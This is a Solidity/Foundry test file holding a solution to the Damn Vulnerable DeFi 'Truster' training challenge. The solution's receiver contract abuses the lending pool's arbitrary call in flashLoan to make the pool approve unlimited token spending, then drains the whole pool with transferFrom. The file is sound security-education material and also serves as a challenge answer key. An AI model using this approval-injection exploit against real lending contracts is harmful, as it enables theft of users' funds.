// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */

    // Getting the flash loan
    // And not returning the flash loan to the contract
    // we are not trying to execute the flashloan
    function test_truster() public checkSolvedByPlayer {
        PlayerTrusterFlashloanReceiver flr = new PlayerTrusterFlashloanReceiver(pool, token, recovery);   // deploy the receiver contract for test
        flr.executeFlashLoan();                                        // execute the flash loan

    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract PlayerTrusterFlashloanReceiver {
        // a flashLoan receiver and execution contract
        // we need the pool that offers the flash loan and the token address for the flashloan token
        TrusterLenderPool pool;       // The pool offering the flashloan
        DamnValuableToken token;      // DVT token to borrow
        address recovery;

        // setting the pool and token
        constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
            pool = _pool;
            token = _token;
            recovery = _recovery;
        }

        function executeFlashLoan() external {
            uint256 amountToBorrow = 0;
            bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
            pool.flashLoan(amountToBorrow, address(this), address(token), data);
            token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
        }

        // what should we use this flashLoan for?
        //function _execute() external {
          //  console.log("IDK WHAT TO USE THIS TOKENS FOR");
        //}

    }
